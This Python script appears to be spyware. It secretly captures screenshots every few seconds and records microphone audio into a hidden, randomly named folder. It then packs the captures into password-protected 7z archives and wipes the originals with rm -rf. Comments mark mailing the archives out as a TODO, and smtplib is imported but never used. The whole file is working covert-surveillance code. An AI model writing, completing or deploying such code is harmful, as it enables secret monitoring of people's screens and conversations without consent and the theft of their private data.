import pyscreenshot as imagegrab
import time
import platform
import os
import random
import string
import threading
import smtplib
import subprocess
import py7zr
import requests
import sounddevice as sd
from scipy.io.wavfile import write

images = []

folder_name = ''

k = 10 #limit for now
file_name = "screenshot{i}.png"

def os_type():
    """
    Depending on the system i might do things differently
    """
    return platform.system()

def check_internet_con():
    response  = requests.get("https://www.google.com")
    if response.status_code == 200:
        return True
    return False

def image_paths(directory):
    """
    Get root paths of wanted recources, in this case it's the root path of all screenshots taken.
    :the paths of the files will be stored in the file_parth list
    """
    file_path_list = [] #store list of file root paths

    for root, directory, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            file_path_list.append(file_path)

    return file_path_list

def zip_files(folder_name):
    """
    This will compress the screenshots folder with 7z
    And encrypt it with a password, don't make it an easy password
    """
    screenzip = random_word(7) + '.7z'

    with py7zr.SevenZipFile(screenzip, 'w', password='%w4A8gd-v') as archive:
        archive.writeall(folder_name, 'base')
    return screenzip

def random_word(length):
    """
    Generate random string, this is for creating randomly named files and folders
    """
    letters = string.ascii_lowercase
    word = []
    for i in range(length):
        word.append(letters[random.randint(1,25)])
    return("".join(word))

folder_name = "." + random_word(5) + '/' #folder
subprocess.run(['mkdir', folder_name])


def record_pc_audio():
    """
    This code is kinda crap for now, but it works, records audio
    IMPORTANT: the recording seconds must be less than the report thread seconds
    """
    global folder_name
    audio_file = random_word(5) + ".wav"
    fs = 44100  # Sample rate
    myrecording = sd.rec(int(9 * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    write(folder_name + audio_file, fs, myrecording) # Save as WAV file

def report():
    """
    This function will be a thread, compresses the screenshots and saves it to disk
    TODO send email and cleanup and accept parameters for some the stuff
    """
    zipped = zip_files(folder_name)
    os.system(f"cd {folder_name} && rm -rf *")
    subprocess.run(['mv', zipped,'logs']) # send this attachment by mail
    record_pc_audio()
    timer = threading.Timer(10, report)
    timer.start()

report()

i = 0
while True:
    screenshot = imagegrab.grab()
    screenshot.save(folder_name + file_name.format(i = i))
    i+= 1
    time.sleep(3)

